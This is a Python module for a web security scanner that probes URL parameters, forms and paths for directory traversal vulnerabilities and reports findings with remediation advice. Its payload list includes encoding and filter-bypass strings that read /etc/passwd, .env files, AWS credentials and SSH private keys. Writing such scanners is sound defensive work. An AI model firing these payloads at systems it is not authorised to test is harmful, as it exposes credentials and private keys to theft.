"""
Directory traversal scanner for path traversal vulnerabilities.
"""

import re
import urllib.parse
from typing import Dict, List, Optional, Tuple

import httpx

from ..models import Finding, Severity, Confidence


class DirectoryTraversalScanner:
    """Scanner for directory/path traversal vulnerabilities."""
    
    # Traversal payloads for different contexts
    TRAVERSAL_PAYLOADS = [
        # Basic traversal
        ('../../../etc/passwd', 'root:x:0:0:'),
        ('../../etc/passwd', 'root:x:0:0:'),
        ('../etc/passwd', 'root:x:0:0:'),
        ('..\\..\\..\\windows\\win.ini', 'for 16-bit app support'),
        ('..\\..\\windows\\win.ini', 'for 16-bit app support'),
        
        # URL encoded variants
        ('..%2f..%2f..%2fetc%2fpasswd', 'root:x:0:0:'),
        ('..%252f..%252f..%252fetc%252fpasswd', 'root:x:0:0:'),
        ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'root:x:0:0:'),
        ('..%c0%af..%c0%af..%c0%afetc/passwd', 'root:x:0:0:'),  # UTF-8 overlong encoding
        ('..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd', 'root:x:0:0:'),  # Unicode slash
        
        # Double encoding
        ('..%255c..%255c..%255cwindows%255cwin.ini', 'for 16-bit app support'),
        
        # Null byte variants (older PHP)
        ('../../../etc/passwd%00', 'root:x:0:0:'),
        ('../../../etc/passwd%00.jpg', 'root:x:0:0:'),
        
        # Absolute path variants
        ('/etc/passwd', 'root:x:0:0:'),
        ('/etc/passwd%00', 'root:x:0:0:'),
        ('C:/windows/win.ini', 'for 16-bit app support'),
        ('C:\\\\windows\\\\win.ini', 'for 16-bit app support'),
        
        # Nested traversal
        ('....//....//....//etc/passwd', 'root:x:0:0:'),
        ('....\\\\....\\\\....\\\\windows\\\\win.ini', 'for 16-bit app support'),
        
        # Alternative encodings
        ('..////..////..////etc/passwd', 'root:x:0:0:'),
        ('..\\\\..\\\\..\\\\windows\\\\win.ini', 'for 16-bit app support'),
        
        # Bypass tricks
        ('...//...//...//etc/passwd', 'root:x:0:0:'),
        ('..././..././..././etc/passwd', 'root:x:0:0:'),
        ('..;/..;/..;/etc/passwd', 'root:x:0:0:'),  # Nginx path traversal
        
        # Common application files
        ('../../../config.php', '<?php'),
        ('../../../config/database.yml', 'adapter:'),
        ('../../../.env', 'APP_KEY='),
        ('../../../web.config', '<configuration>'),
        ('../../application.properties', 'spring.'),
        ('../../../pom.xml', '<project>'),
        ('../../../package.json', '"dependencies"'),
        ('../../../requirements.txt', '=='),
        ('../../../Dockerfile', 'FROM'),
        ('../../../docker-compose.yml', 'services:'),
        ('../../../.git/config', '[core]'),
        ('../../../.htaccess', 'RewriteEngine'),
        ('../../../.aws/credentials', 'aws_access_key_id'),
        ('../../../id_rsa', 'BEGIN RSA PRIVATE KEY'),
        ('../../../.ssh/id_rsa', 'BEGIN OPENSSH PRIVATE KEY'),
    ]
    
    # Error patterns that indicate file system access
    FILE_ERROR_PATTERNS = [
        r'No such file or directory',
        r'File not found',
        r'fopen\(',
        r'file_get_contents',
        r'java\.io\.FileNotFoundException',
        r'System\.IO\.FileNotFoundException',
        r'Path not found',
        r'Invalid path',
        r'Permission denied',
        r'Access is denied',
        r'Cannot open file',
        r'Failed to open stream',
    ]
    
    def __init__(self, client: httpx.AsyncClient):
        self.client = client
    
    def _detect_file_error(self, response_text: str) -> Optional[str]:
        """Detect file-related error messages."""
        for pattern in self.FILE_ERROR_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None
    
    def _is_file_content(self, response_text: str, indicator: str) -> bool:
        """Check if response contains expected file content."""
        return indicator in response_text
    
    async def _test_traversal(self, url: str, param: str, 
                              method: str = "GET") -> List[Finding]:
        """Test a parameter for directory traversal."""
        findings = []
        
        # Get baseline response
        try:
            if method == "GET":
                baseline_response = await self.client.get(url, follow_redirects=True)
            else:
                baseline_response = await self.client.post(url, data={param: "test"},
                                                           follow_redirects=True)
            baseline_text = baseline_response.text
        except Exception:
            baseline_text = ""
        
        for payload, indicator in self.TRAVERSAL_PAYLOADS:
            try:
                if method == "GET":
                    parsed = urllib.parse.urlparse(url)
                    params = urllib.parse.parse_qs(parsed.query)
                    params[param] = payload
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                    response = await self.client.get(test_url, follow_redirects=True)
                else:
                    response = await self.client.post(url, data={param: payload},
                                                       follow_redirects=True)
                
                # Check for file content
                if indicator in response.text and indicator not in baseline_text:
                    # Determine OS based on file accessed
                    os_type = "Linux/Unix" if "etc/passwd" in payload or "root:x:" in indicator else "Windows"
                    file_accessed = "/etc/passwd" if "etc/passwd" in payload else "system file"
                    
                    findings.append(Finding(
                        title=f"Directory Traversal ({os_type})",
                        description=f"Directory traversal vulnerability detected in parameter '{param}'. "
                                   f"The application allows reading arbitrary files from the server.",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        target=url,
                        finding_type="directory_traversal",
                        evidence=f"File content accessed: {indicator[:50]}...",
                        remediation="Validate and sanitize all file path inputs. "
                                   "Use allowlists for permitted file paths. "
                                   "Avoid passing user input directly to file system operations. "
                                   "Use chroot jails or sandboxed environments.",
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://portswigger.net/web-security/file-path-traversal",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html",
                        ],
                        parameter=param,
                        payload=payload,
                    ))
                    return findings  # Found vulnerability, no need to test more payloads
                
                # Check for file errors that indicate traversal is being processed
                error = self._detect_file_error(response.text)
                if error and error not in baseline_text:
                    # Potential traversal - file error indicates path processing
                    findings.append(Finding(
                        title="Directory Traversal - Possible",
                        description=f"Potential directory traversal in parameter '{param}'. "
                                   f"File system error detected, indicating path traversal is being processed.",
                        severity=Severity.MEDIUM,
                        confidence=Confidence.LOW,
                        target=url,
                        finding_type="directory_traversal_possible",
                        evidence=f"File error: {error}",
                        remediation="Validate and sanitize all file path inputs. "
                                   "Use allowlists for permitted file paths.",
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                        ],
                        parameter=param,
                        payload=payload,
                    ))
                    
            except Exception:
                continue
        
        return findings
    
    async def _test_path_parameter(self, url: str) -> List[Finding]:
        """Test URL path itself for traversal (REST-style APIs)."""
        findings = []
        
        # Common path patterns that might be vulnerable
        path_traversal_tests = [
            ('/images/../../../etc/passwd', 'root:x:0:0:'),
            ('/files/../../../etc/passwd', 'root:x:0:0:'),
            ('/download/../../../etc/passwd', 'root:x:0:0:'),
            ('/view/../../../etc/passwd', 'root:x:0:0:'),
            ('/static/../../../etc/passwd', 'root:x:0:0:'),
            ('/assets/../../../etc/passwd', 'root:x:0:0:'),
            ('/uploads/../../../etc/passwd', 'root:x:0:0:'),
        ]
        
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for path_suffix, indicator in path_traversal_tests:
            test_url = base_url + path_suffix
            
            try:
                response = await self.client.get(test_url, follow_redirects=True)
                
                if indicator in response.text:
                    findings.append(Finding(
                        title="Directory Traversal in URL Path",
                        description="Directory traversal vulnerability detected in URL path. "
                                   "The application allows reading arbitrary files via path manipulation.",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        target=test_url,
                        finding_type="directory_traversal_path",
                        evidence=f"File content accessed: {indicator[:50]}...",
                        remediation="Validate URL paths on the server side. "
                                   "Use allowlists for permitted paths. "
                                   "Never use user input to construct file paths directly.",
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://portswigger.net/web-security/file-path-traversal",
                        ],
                        payload=path_suffix,
                    ))
                    break
                    
            except Exception:
                continue
        
        return findings
    
    async def scan_url(self, url: str, parameters: Optional[List[str]] = None) -> List[Finding]:
        """Scan a URL for directory traversal vulnerabilities."""
        findings = []
        
        # Test URL path for traversal
        path_findings = await self._test_path_parameter(url)
        findings.extend(path_findings)
        
        # Extract parameters if not provided
        if parameters is None:
            parsed = urllib.parse.urlparse(url)
            parameters = list(urllib.parse.parse_qs(parsed.query).keys())
        
        # Test query parameters
        for param in parameters:
            param_findings = await self._test_traversal(url, param)
            findings.extend(param_findings)
        
        return findings
    
    async def scan_form(self, url: str, form_data: Dict[str, str]) -> List[Finding]:
        """Scan a form for directory traversal vulnerabilities."""
        findings = []
        
        for param in form_data.keys():
            param_findings = await self._test_traversal(url, param, method="POST")
            findings.extend(param_findings)
        
        return findings
    
    async def scan_file_endpoint(self, url: str) -> List[Finding]:
        """Scan file-serving endpoints specifically."""
        findings = []
        
        # Common file endpoint patterns
        file_params = ['file', 'path', 'filename', 'name', 'doc', 'document', 
                       'image', 'img', 'download', 'attachment', 'resource']
        
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in file_params:
            if param in params:
                param_findings = await self._test_traversal(url, param)
                findings.extend(param_findings)
        
        return findings
